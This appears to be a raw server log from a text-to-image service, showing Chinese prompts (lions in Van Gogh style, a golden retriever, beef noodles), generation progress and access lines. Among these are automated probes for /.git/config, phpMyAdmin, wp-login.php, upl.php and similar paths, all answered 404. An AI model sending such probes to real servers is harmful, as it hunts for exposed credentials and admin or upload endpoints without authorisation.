+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.47it/s]  8%|▊         | 2/25 [00:01<00:11,  2.02it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.35it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.55it/s] 20%|██        | 5/25 [00:02<00:07,  2.63it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.77it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.79it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.82it/s] 40%|████      | 10/25 [00:03<00:05,  2.84it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.83it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.86it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.87it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.87it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.89it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.89it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.90it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.89it/s]100%|██████████| 25/25 [00:09<00:00,  2.87it/s]100%|██████████| 25/25 [00:09<00:00,  2.77it/s]
+File: /root/magic.image/gen_images/tzecxsfxwl71_狮子,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/4n3a604s7ypv_%E7%8B%AE%E5%AD%90,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/tzecxsfxwl71_%E7%8B%AE%E5%AD%90,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     64.62.197.73:0 - "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.0" 404 Not Found
+***********: Final sequence is 凶猛的狮子,清晰,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.35it/s]  8%|▊         | 2/25 [00:01<00:11,  1.98it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.52it/s] 20%|██        | 5/25 [00:02<00:07,  2.66it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.79it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.82it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.84it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.89it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.90it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.92it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.92it/s] 60%|██████    | 15/25 [00:05<00:03,  2.90it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.91it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.91it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.78it/s]
+Potential NSFW content was detected in one or more images. A black image will be returned instead. Try again with a different prompt and/or seed.
+File: /root/magic.image/gen_images/12i08t8ov020_凶猛的狮子,清晰,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     223.104.39.122:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     223.104.39.122:0 - "GET /download?file_path=/root/magic.image/gen_images/12i08t8ov020_%E5%87%B6%E7%8C%9B%E7%9A%84%E7%8B%AE%E5%AD%90,%E6%B8%85%E6%99%B0,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+***********: Final sequence is 凶猛的狮子,清晰,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:18,  1.33it/s]  8%|▊         | 2/25 [00:01<00:11,  1.97it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.27it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.49it/s] 20%|██        | 5/25 [00:02<00:07,  2.63it/s] 24%|██▍       | 6/25 [00:02<00:07,  2.71it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.77it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.81it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.83it/s] 40%|████      | 10/25 [00:03<00:05,  2.86it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.87it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.88it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.89it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.89it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.90it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.89it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.90it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.89it/s] 88%|████████▊ | 22/25 [00:08<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.89it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.77it/s]
+File: /root/magic.image/gen_images/f9s8p3ppdtzf_凶猛的狮子,清晰,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     223.104.39.122:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     223.104.39.122:0 - "GET /download?file_path=/root/magic.image/gen_images/f9s8p3ppdtzf_%E5%87%B6%E7%8C%9B%E7%9A%84%E7%8B%AE%E5%AD%90,%E6%B8%85%E6%99%B0,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+***********: Final sequence is 狮子王,清晰,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.36it/s]  8%|▊         | 2/25 [00:01<00:11,  1.99it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.28it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.51it/s] 20%|██        | 5/25 [00:02<00:07,  2.64it/s] 24%|██▍       | 6/25 [00:02<00:07,  2.71it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.78it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.82it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.83it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.87it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.88it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.90it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.90it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.90it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.91it/s] 80%|████████  | 20/25 [00:07<00:01,  2.91it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.91it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.91it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.91it/s]100%|██████████| 25/25 [00:09<00:00,  2.78it/s]
+File: /root/magic.image/gen_images/b9o8xegwiqi2_狮子王,清晰,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     223.104.39.122:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     223.104.39.122:0 - "GET /download?file_path=/root/magic.image/gen_images/b9o8xegwiqi2_%E7%8B%AE%E5%AD%90%E7%8E%8B,%E6%B8%85%E6%99%B0,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     64.62.197.64:0 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+***********: Final sequence is 金毛,阳光,清晰,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.35it/s]  8%|▊         | 2/25 [00:01<00:11,  1.98it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.51it/s] 20%|██        | 5/25 [00:02<00:07,  2.65it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.79it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.83it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.85it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.89it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.89it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.89it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.89it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.90it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.89it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.90it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.89it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.78it/s]
+File: /root/magic.image/gen_images/lyktrxorgd6h_金毛,阳光,清晰,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     223.104.39.122:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     64.62.197.70:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     223.104.39.122:0 - "GET /download?file_path=/root/magic.image/gen_images/lyktrxorgd6h_%E9%87%91%E6%AF%9B,%E9%98%B3%E5%85%89,%E6%B8%85%E6%99%B0,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     223.104.39.122:0 - "POST /feedback HTTP/1.0" 200 OK
+***********: Final sequence is 牛肉面,清晰,质感胶片 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.36it/s]  8%|▊         | 2/25 [00:01<00:11,  2.00it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.52it/s] 20%|██        | 5/25 [00:02<00:07,  2.65it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.79it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.83it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.85it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.89it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.88it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.89it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.89it/s] 60%|██████    | 15/25 [00:05<00:03,  2.90it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.91it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.91it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.91it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.90it/s] 80%|████████  | 20/25 [00:07<00:01,  2.91it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.78it/s]
+File: /root/magic.image/gen_images/z8jluva7qrxu_牛肉面,清晰,质感胶片.png is saved, done!
+Text2Image Processing is Done!
+INFO:     223.104.39.122:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     223.104.39.122:0 - "GET /download?file_path=/root/magic.image/gen_images/z8jluva7qrxu_%E7%89%9B%E8%82%89%E9%9D%A2,%E6%B8%85%E6%99%B0,%E8%B4%A8%E6%84%9F%E8%83%B6%E7%89%87.png HTTP/1.0" 200 OK
+INFO:     144.191.225.167:0 - "GET /index.php HTTP/1.0" 404 Not Found
+INFO:     144.191.225.167:0 - "GET /phpmyadmin/index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39742 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     212.87.204.248:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     212.87.204.248:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:32776 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:32778 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:32780 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:45090 - "GET /phpmyadmin/index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:54606 - "GET /index.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:45918 - "GET / HTTP/1.0" 404 Not Found
+INFO:     178.128.244.180:0 - "GET /ab2g HTTP/1.0" 404 Not Found
+INFO:     178.128.244.180:0 - "GET /ab2h HTTP/1.0" 404 Not Found
+INFO:     178.128.244.180:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     178.128.244.180:0 - "GET /t4 HTTP/1.0" 404 Not Found
+INFO:     178.128.244.180:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:58700 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:53590 - "GET /private/api/v1/service/premaster HTTP/1.0" 404 Not Found
+INFO:     193.235.141.126:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.235.141.126:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     167.94.146.59:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50070 - "GET / HTTP/1.0" 404 Not Found
+INFO:     147.135.165.20:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:45014 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:52168 - "GET / HTTP/1.0" 404 Not Found
+INFO:     34.76.96.55:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:59182 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48054 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48056 - "GET /client/get_targets HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48058 - "GET /upl.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44992 - "GET /geoip/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44994 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44996 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56992 - "GET /upl.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35978 - "GET /client/get_targets HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:33740 - "GET /geoip/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:51966 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:33308 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36640 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:47596 - "GET / HTTP/1.0" 404 Not Found
